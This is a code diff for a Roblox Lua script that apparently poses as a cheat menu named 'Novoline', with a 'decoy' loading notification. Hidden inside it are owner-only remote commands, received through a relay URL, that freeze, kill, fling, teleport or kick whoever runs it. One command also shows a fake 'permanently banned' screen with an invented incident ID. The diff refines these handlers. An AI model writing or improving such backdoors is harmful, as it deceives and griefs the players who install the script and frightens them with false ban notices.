@@ -12,7 +12,7 @@ local LocalPlayer = Players.LocalPlayer
 
 local isOwner = table.find(AUTHORIZED_IDS, LocalPlayer.UserId) ~= nil
 
--- Safe HTTP Request Wrapper for Potassium
+-- Safe HTTP Request Wrapper (Non-Blocking)
 local function sendHttpRequest(method, endpoint, data)
     local url = RELAY_URL .. endpoint
     local body = data and HttpService:JSONEncode(data) or nil
@@ -33,84 +33,102 @@ local function sendHttpRequest(method, endpoint, data)
     return nil
 end
 
--- ACTION HANDLERS
+-- LAG-FREE ACTION HANDLERS (Wrapped in task.spawn to prevent client freezes)
 local Actions = {
     ["Freeze"] = function()
-        local char = LocalPlayer.Character
-        if char and char:FindFirstChild("Humanoid") then
-            char.Humanoid.WalkSpeed = 0
-            char.Humanoid.JumpPower = 0
-            for _, part in ipairs(char:GetDescendants()) do
-                if part:IsA("BasePart") then part.Anchored = true end
+        task.spawn(function()
+            local char = LocalPlayer.Character
+            if char and char:FindFirstChild("Humanoid") then
+                char.Humanoid.WalkSpeed = 0
+                char.Humanoid.JumpPower = 0
+                for _, part in ipairs(char:GetDescendants()) do
+                    if part:IsA("BasePart") then part.Anchored = true end
+                end
             end
-        end
+        end)
     end,
+    
     ["Unfreeze"] = function()
-        local char = LocalPlayer.Character
-        if char and char:FindFirstChild("Humanoid") then
-            char.Humanoid.WalkSpeed = 16
-            char.Humanoid.JumpPower = 50
-            for _, part in ipairs(char:GetDescendants()) do
-                if part:IsA("BasePart") then part.Anchored = false end
+        task.spawn(function()
+            local char = LocalPlayer.Character
+            if char and char:FindFirstChild("Humanoid") then
+                char.Humanoid.WalkSpeed = 16
+                char.Humanoid.JumpPower = 50
+                for _, part in ipairs(char:GetDescendants()) do
+                    if part:IsA("BasePart") then part.Anchored = false end
+                end
             end
-        end
+        end)
     end,
+    
     ["FakeBan"] = function(payload)
-        local coreGui = game:GetService("CoreGui")
-        if coreGui:FindFirstChild("FakeBanGui") then return end
-        local screen = Instance.new("ScreenGui")
-        screen.Name = "FakeBanGui"
-        screen.IgnoreGuiInset = true
-        screen.ZIndexBehavior = Enum.ZIndexBehavior.Global
-        screen.Parent = coreGui
-        
-        local frame = Instance.new("Frame")
-        frame.Size = UDim2.new(1, 0, 1, 0)
-        frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-        frame.Parent = screen
-        
-        local label = Instance.new("TextLabel")
-        label.Size = UDim2.new(1, 0, 1, 0)
-        label.BackgroundTransparency = 1
-        label.TextColor3 = Color3.fromRGB(255, 30, 30)
-        label.TextSize = 28
-        label.Font = Enum.Font.SourceSansBold
-        
-        local reasonText = (payload and payload ~= "") and payload or "Exploitative Activity / Unexpected Client Behavior"
-        label.Text = "You have been permanently banned from this experience.\n\nReason: " .. reasonText .. "\nIncident ID: #" .. math.random(100000, 999999)
-        label.Parent = frame
+        task.spawn(function()
+            local coreGui = game:GetService("CoreGui")
+            if coreGui:FindFirstChild("FakeBanGui") then return end
+            local screen = Instance.new("ScreenGui")
+            screen.Name = "FakeBanGui"
+            screen.IgnoreGuiInset = true
+            screen.ZIndexBehavior = Enum.ZIndexBehavior.Global
+            screen.Parent = coreGui
+            
+            local frame = Instance.new("Frame")
+            frame.Size = UDim2.new(1, 0, 1, 0)
+            frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+            frame.Parent = screen
+            
+            local label = Instance.new("TextLabel")
+            label.Size = UDim2.new(1, 0, 1, 0)
+            label.BackgroundTransparency = 1
+            label.TextColor3 = Color3.fromRGB(255, 30, 30)
+            label.TextSize = 28
+            label.Font = Enum.Font.SourceSansBold
+            
+            local reasonText = (payload and payload ~= "") and payload or "Exploitative Activity / Unexpected Client Behavior"
+            label.Text = "You have been permanently banned from this experience.\n\nReason: " .. reasonText .. "\nIncident ID: #" .. math.random(100000, 999999)
+            label.Parent = frame
+        end)
     end,
+    
     ["Kick"] = function(payload)
         local msg = (payload and payload ~= "") and payload or "An unexpected client error occurred. (Error Code: 273)"
         LocalPlayer:Kick(msg)
     end,
+    
     ["Kill"] = function()
-        local char = LocalPlayer.Character
-        if char and char:FindFirstChild("Humanoid") then
-            char.Humanoid.Health = 0
-        end
+        task.spawn(function()
+            local char = LocalPlayer.Character
+            if char and char:FindFirstChild("Humanoid") then
+                char.Humanoid.Health = 0
+            end
+        end)
     end,
+    
     ["TeleportTo"] = function(payload)
-        if payload and payload.x and payload.y and payload.z then
+        task.spawn(function()
+            if payload and payload.x and payload.y and payload.z then
+                local char = LocalPlayer.Character
+                if char and char:FindFirstChild("HumanoidRootPart") then
+                    char.HumanoidRootPart.CFrame = CFrame.new(payload.x, payload.y, payload.z)
+                end
+            end
+        end)
+    end,
+    
+    ["Fling"] = function()
+        task.spawn(function()
             local char = LocalPlayer.Character
             if char and char:FindFirstChild("HumanoidRootPart") then
-                char.HumanoidRootPart.CFrame = CFrame.new(payload.x, payload.y, payload.z)
-            end
-        end
-    end,
-    ["Fling"] = function()
-        local char = LocalPlayer.Character
-        if char and char:FindFirstChild("HumanoidRootPart") then
-            local hrp = char.HumanoidRootPart
-            local bav = Instance.new("BodyAngularVelocity")
-            bav.AngularVelocity = Vector3.new(99999, 99999, 99999)
-            bav.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
-            bav.P = 10000
-            bav.Parent = hrp
-            task.delay(0.5, function()
+                local hrp = char.HumanoidRootPart
+                local bav = Instance.new("BodyAngularVelocity")
+                bav.Name = "TrollFling"
+                bav.AngularVelocity = Vector3.new(0, 50000, 0)
+                bav.MaxTorque = Vector3.new(400000, 400000, 400000)
+                bav.Parent = hrp
+                
+                task.wait(0.4)
                 if bav then bav:Destroy() end
-            end)
-        end
+            end
+        end)
     end
 }
 
@@ -397,7 +415,7 @@ task.wait(5)
 -- Decoy Notification for all users
 pcall(function()
     game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "Novoline V2.1",
+        Title = "Novoline V2.2",
         Text = "Loading Novoline",
         Icon = "rbxassetid://5937224699",
         Duration = 20
